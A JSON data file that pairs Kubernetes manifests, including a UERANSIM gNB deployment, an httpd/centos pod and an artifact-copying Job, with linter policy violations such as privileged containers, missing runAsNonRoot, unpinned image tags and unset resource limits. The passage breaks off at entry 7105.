    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ueransim-gnb-deployment\n  labels:\n    app: ueransim-gnb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ueransim-gnb\n  template:\n    metadata:\n      labels:\n        app: ueransim-gnb\n    spec:\n      containers:\n      - name: ueransim-gnb\n        imagePullPolicy: IfNotPresent\n        image: free5gmano/ueransim:v3.1.4\n        securityContext:\n          privileged: true\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - ./build/nr-gnb -c ./config/open5gs-gnb.yaml\n        volumeMounts:\n        - name: gnb-conf\n          mountPath: /UERANSIM/config/open5gs-gnb.yaml\n          subPath: open5gs-gnb.yaml\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.18/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: gnb-conf\n        configMap:\n          name: ueransim-configmap\n          items:\n          - key: open5gs-gnb.yaml\n            path: open5gs-gnb.yaml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ueransim-gnb\" does not have a read-only root file system"
  },
  {
    "id": "7076",
    "manifest_path": "data/manifests/the_stack_sample/sample_2576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ueransim-gnb-deployment\n  labels:\n    app: ueransim-gnb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ueransim-gnb\n  template:\n    metadata:\n      labels:\n        app: ueransim-gnb\n    spec:\n      containers:\n      - name: ueransim-gnb\n        imagePullPolicy: IfNotPresent\n        image: free5gmano/ueransim:v3.1.4\n        securityContext:\n          privileged: true\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - ./build/nr-gnb -c ./config/open5gs-gnb.yaml\n        volumeMounts:\n        - name: gnb-conf\n          mountPath: /UERANSIM/config/open5gs-gnb.yaml\n          subPath: open5gs-gnb.yaml\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.18/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: gnb-conf\n        configMap:\n          name: ueransim-configmap\n          items:\n          - key: open5gs-gnb.yaml\n            path: open5gs-gnb.yaml\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"ueransim-gnb\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "7077",
    "manifest_path": "data/manifests/the_stack_sample/sample_2576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ueransim-gnb-deployment\n  labels:\n    app: ueransim-gnb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ueransim-gnb\n  template:\n    metadata:\n      labels:\n        app: ueransim-gnb\n    spec:\n      containers:\n      - name: ueransim-gnb\n        imagePullPolicy: IfNotPresent\n        image: free5gmano/ueransim:v3.1.4\n        securityContext:\n          privileged: true\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - ./build/nr-gnb -c ./config/open5gs-gnb.yaml\n        volumeMounts:\n        - name: gnb-conf\n          mountPath: /UERANSIM/config/open5gs-gnb.yaml\n          subPath: open5gs-gnb.yaml\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.18/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: gnb-conf\n        configMap:\n          name: ueransim-configmap\n          items:\n          - key: open5gs-gnb.yaml\n            path: open5gs-gnb.yaml\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"ueransim-gnb\" is privileged"
  },
  {
    "id": "7078",
    "manifest_path": "data/manifests/the_stack_sample/sample_2576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ueransim-gnb-deployment\n  labels:\n    app: ueransim-gnb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ueransim-gnb\n  template:\n    metadata:\n      labels:\n        app: ueransim-gnb\n    spec:\n      containers:\n      - name: ueransim-gnb\n        imagePullPolicy: IfNotPresent\n        image: free5gmano/ueransim:v3.1.4\n        securityContext:\n          privileged: true\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - ./build/nr-gnb -c ./config/open5gs-gnb.yaml\n        volumeMounts:\n        - name: gnb-conf\n          mountPath: /UERANSIM/config/open5gs-gnb.yaml\n          subPath: open5gs-gnb.yaml\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.18/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: gnb-conf\n        configMap:\n          name: ueransim-configmap\n          items:\n          - key: open5gs-gnb.yaml\n            path: open5gs-gnb.yaml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-network-client\" is not set to runAsNonRoot"
  },
  {
    "id": "7079",
    "manifest_path": "data/manifests/the_stack_sample/sample_2576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ueransim-gnb-deployment\n  labels:\n    app: ueransim-gnb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ueransim-gnb\n  template:\n    metadata:\n      labels:\n        app: ueransim-gnb\n    spec:\n      containers:\n      - name: ueransim-gnb\n        imagePullPolicy: IfNotPresent\n        image: free5gmano/ueransim:v3.1.4\n        securityContext:\n          privileged: true\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - ./build/nr-gnb -c ./config/open5gs-gnb.yaml\n        volumeMounts:\n        - name: gnb-conf\n          mountPath: /UERANSIM/config/open5gs-gnb.yaml\n          subPath: open5gs-gnb.yaml\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.18/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: gnb-conf\n        configMap:\n          name: ueransim-configmap\n          items:\n          - key: open5gs-gnb.yaml\n            path: open5gs-gnb.yaml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ueransim-gnb\" is not set to runAsNonRoot"
  },
  {
    "id": "7080",
    "manifest_path": "data/manifests/the_stack_sample/sample_2576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ueransim-gnb-deployment\n  labels:\n    app: ueransim-gnb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ueransim-gnb\n  template:\n    metadata:\n      labels:\n        app: ueransim-gnb\n    spec:\n      containers:\n      - name: ueransim-gnb\n        imagePullPolicy: IfNotPresent\n        image: free5gmano/ueransim:v3.1.4\n        securityContext:\n          privileged: true\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - ./build/nr-gnb -c ./config/open5gs-gnb.yaml\n        volumeMounts:\n        - name: gnb-conf\n          mountPath: /UERANSIM/config/open5gs-gnb.yaml\n          subPath: open5gs-gnb.yaml\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.18/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: gnb-conf\n        configMap:\n          name: ueransim-configmap\n          items:\n          - key: open5gs-gnb.yaml\n            path: open5gs-gnb.yaml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-network-client\" has cpu request 0"
  },
  {
    "id": "7081",
    "manifest_path": "data/manifests/the_stack_sample/sample_2576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ueransim-gnb-deployment\n  labels:\n    app: ueransim-gnb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ueransim-gnb\n  template:\n    metadata:\n      labels:\n        app: ueransim-gnb\n    spec:\n      containers:\n      - name: ueransim-gnb\n        imagePullPolicy: IfNotPresent\n        image: free5gmano/ueransim:v3.1.4\n        securityContext:\n          privileged: true\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - ./build/nr-gnb -c ./config/open5gs-gnb.yaml\n        volumeMounts:\n        - name: gnb-conf\n          mountPath: /UERANSIM/config/open5gs-gnb.yaml\n          subPath: open5gs-gnb.yaml\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.18/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: gnb-conf\n        configMap:\n          name: ueransim-configmap\n          items:\n          - key: open5gs-gnb.yaml\n            path: open5gs-gnb.yaml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ueransim-gnb\" has cpu request 0"
  },
  {
    "id": "7082",
    "manifest_path": "data/manifests/the_stack_sample/sample_2576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ueransim-gnb-deployment\n  labels:\n    app: ueransim-gnb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ueransim-gnb\n  template:\n    metadata:\n      labels:\n        app: ueransim-gnb\n    spec:\n      containers:\n      - name: ueransim-gnb\n        imagePullPolicy: IfNotPresent\n        image: free5gmano/ueransim:v3.1.4\n        securityContext:\n          privileged: true\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - ./build/nr-gnb -c ./config/open5gs-gnb.yaml\n        volumeMounts:\n        - name: gnb-conf\n          mountPath: /UERANSIM/config/open5gs-gnb.yaml\n          subPath: open5gs-gnb.yaml\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.18/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: gnb-conf\n        configMap:\n          name: ueransim-configmap\n          items:\n          - key: open5gs-gnb.yaml\n            path: open5gs-gnb.yaml\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-network-client\" has memory limit 0"
  },
  {
    "id": "7083",
    "manifest_path": "data/manifests/the_stack_sample/sample_2576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ueransim-gnb-deployment\n  labels:\n    app: ueransim-gnb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ueransim-gnb\n  template:\n    metadata:\n      labels:\n        app: ueransim-gnb\n    spec:\n      containers:\n      - name: ueransim-gnb\n        imagePullPolicy: IfNotPresent\n        image: free5gmano/ueransim:v3.1.4\n        securityContext:\n          privileged: true\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - ./build/nr-gnb -c ./config/open5gs-gnb.yaml\n        volumeMounts:\n        - name: gnb-conf\n          mountPath: /UERANSIM/config/open5gs-gnb.yaml\n          subPath: open5gs-gnb.yaml\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.18/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: gnb-conf\n        configMap:\n          name: ueransim-configmap\n          items:\n          - key: open5gs-gnb.yaml\n            path: open5gs-gnb.yaml\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ueransim-gnb\" has memory limit 0"
  },
  {
    "id": "7084",
    "manifest_path": "data/manifests/the_stack_sample/sample_2577.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-2cntrs\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n  - name: cntr-centos\n    image: centos\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - \"while true ; do\\n  date\\n  curl http://127.0.0.1\\n  sleep 5 \\ndone\"\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cntr-centos\" is using an invalid container image, \"centos\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7085",
    "manifest_path": "data/manifests/the_stack_sample/sample_2577.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-2cntrs\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n  - name: cntr-centos\n    image: centos\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - \"while true ; do\\n  date\\n  curl http://127.0.0.1\\n  sleep 5 \\ndone\"\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cntr-httpd\" is using an invalid container image, \"httpd:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7086",
    "manifest_path": "data/manifests/the_stack_sample/sample_2577.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-2cntrs\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n  - name: cntr-centos\n    image: centos\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - \"while true ; do\\n  date\\n  curl http://127.0.0.1\\n  sleep 5 \\ndone\"\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cntr-centos\" does not have a read-only root file system"
  },
  {
    "id": "7087",
    "manifest_path": "data/manifests/the_stack_sample/sample_2577.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-2cntrs\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n  - name: cntr-centos\n    image: centos\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - \"while true ; do\\n  date\\n  curl http://127.0.0.1\\n  sleep 5 \\ndone\"\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cntr-httpd\" does not have a read-only root file system"
  },
  {
    "id": "7088",
    "manifest_path": "data/manifests/the_stack_sample/sample_2577.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-2cntrs\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n  - name: cntr-centos\n    image: centos\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - \"while true ; do\\n  date\\n  curl http://127.0.0.1\\n  sleep 5 \\ndone\"\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cntr-centos\" is not set to runAsNonRoot"
  },
  {
    "id": "7089",
    "manifest_path": "data/manifests/the_stack_sample/sample_2577.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-2cntrs\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n  - name: cntr-centos\n    image: centos\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - \"while true ; do\\n  date\\n  curl http://127.0.0.1\\n  sleep 5 \\ndone\"\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cntr-httpd\" is not set to runAsNonRoot"
  },
  {
    "id": "7090",
    "manifest_path": "data/manifests/the_stack_sample/sample_2577.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-2cntrs\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n  - name: cntr-centos\n    image: centos\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - \"while true ; do\\n  date\\n  curl http://127.0.0.1\\n  sleep 5 \\ndone\"\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cntr-centos\" has cpu request 0"
  },
  {
    "id": "7091",
    "manifest_path": "data/manifests/the_stack_sample/sample_2577.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-2cntrs\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n  - name: cntr-centos\n    image: centos\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - \"while true ; do\\n  date\\n  curl http://127.0.0.1\\n  sleep 5 \\ndone\"\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cntr-httpd\" has cpu request 0"
  },
  {
    "id": "7092",
    "manifest_path": "data/manifests/the_stack_sample/sample_2577.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-2cntrs\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n  - name: cntr-centos\n    image: centos\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - \"while true ; do\\n  date\\n  curl http://127.0.0.1\\n  sleep 5 \\ndone\"\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cntr-centos\" has memory limit 0"
  },
  {
    "id": "7093",
    "manifest_path": "data/manifests/the_stack_sample/sample_2577.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-2cntrs\nspec:\n  containers:\n  - name: cntr-httpd\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n  - name: cntr-centos\n    image: centos\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - \"while true ; do\\n  date\\n  curl http://127.0.0.1\\n  sleep 5 \\ndone\"\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cntr-httpd\" has memory limit 0"
  },
  {
    "id": "7094",
    "manifest_path": "data/manifests/the_stack_sample/sample_2578.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: amd-cpu-pod\nspec:\n  containers:\n  - name: amd-cpu-container\n    image: library/nginx\n    resources:\n      limits:\n        amd.com/cpu: 1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"amd-cpu-container\" is using an invalid container image, \"library/nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7095",
    "manifest_path": "data/manifests/the_stack_sample/sample_2578.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: amd-cpu-pod\nspec:\n  containers:\n  - name: amd-cpu-container\n    image: library/nginx\n    resources:\n      limits:\n        amd.com/cpu: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"amd-cpu-container\" does not have a read-only root file system"
  },
  {
    "id": "7096",
    "manifest_path": "data/manifests/the_stack_sample/sample_2578.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: amd-cpu-pod\nspec:\n  containers:\n  - name: amd-cpu-container\n    image: library/nginx\n    resources:\n      limits:\n        amd.com/cpu: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"amd-cpu-container\" is not set to runAsNonRoot"
  },
  {
    "id": "7097",
    "manifest_path": "data/manifests/the_stack_sample/sample_2578.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: amd-cpu-pod\nspec:\n  containers:\n  - name: amd-cpu-container\n    image: library/nginx\n    resources:\n      limits:\n        amd.com/cpu: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"amd-cpu-container\" has cpu request 0"
  },
  {
    "id": "7098",
    "manifest_path": "data/manifests/the_stack_sample/sample_2578.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: amd-cpu-pod\nspec:\n  containers:\n  - name: amd-cpu-container\n    image: library/nginx\n    resources:\n      limits:\n        amd.com/cpu: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"amd-cpu-container\" has memory limit 0"
  },
  {
    "id": "7099",
    "manifest_path": "data/manifests/the_stack_sample/sample_2579.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: syprashajavascripttetris\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8000\n  selector:\n    app: syprashajavascripttetris\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:syprashajavascripttetris])"
  },
  {
    "id": "7100",
    "manifest_path": "data/manifests/the_stack_sample/sample_2580.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: copyartifacts\nspec:\n  template:\n    metadata:\n      name: copyartifacts\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: copyartifacts\n        image: alpine:3.7\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'ls -l /shared; rm -rf /shared/*; ls -l /shared; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for artifacts to be copied; sleep 2; done; sleep 10;\n          ls -l /shared/artifacts; '\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "7101",
    "manifest_path": "data/manifests/the_stack_sample/sample_2580.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: copyartifacts\nspec:\n  template:\n    metadata:\n      name: copyartifacts\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: copyartifacts\n        image: alpine:3.7\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'ls -l /shared; rm -rf /shared/*; ls -l /shared; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for artifacts to be copied; sleep 2; done; sleep 10;\n          ls -l /shared/artifacts; '\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"copyartifacts\" does not have a read-only root file system"
  },
  {
    "id": "7102",
    "manifest_path": "data/manifests/the_stack_sample/sample_2580.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: copyartifacts\nspec:\n  template:\n    metadata:\n      name: copyartifacts\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: copyartifacts\n        image: alpine:3.7\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'ls -l /shared; rm -rf /shared/*; ls -l /shared; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for artifacts to be copied; sleep 2; done; sleep 10;\n          ls -l /shared/artifacts; '\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"copyartifacts\" is not set to runAsNonRoot"
  },
  {
    "id": "7103",
    "manifest_path": "data/manifests/the_stack_sample/sample_2580.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: copyartifacts\nspec:\n  template:\n    metadata:\n      name: copyartifacts\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: copyartifacts\n        image: alpine:3.7\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'ls -l /shared; rm -rf /shared/*; ls -l /shared; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for artifacts to be copied; sleep 2; done; sleep 10;\n          ls -l /shared/artifacts; '\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"copyartifacts\" has cpu request 0"
  },
  {
    "id": "7104",
    "manifest_path": "data/manifests/the_stack_sample/sample_2580.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: copyartifacts\nspec:\n  template:\n    metadata:\n      name: copyartifacts\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: copyartifacts\n        image: alpine:3.7\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'ls -l /shared; rm -rf /shared/*; ls -l /shared; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for artifacts to be copied; sleep 2; done; sleep 10;\n          ls -l /shared/artifacts; '\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"copyartifacts\" has memory limit 0"
  },
  {
    "id": "7105",
    "manifest_path": "data/manifests/the_stack_sample/sample_2581.yaml",
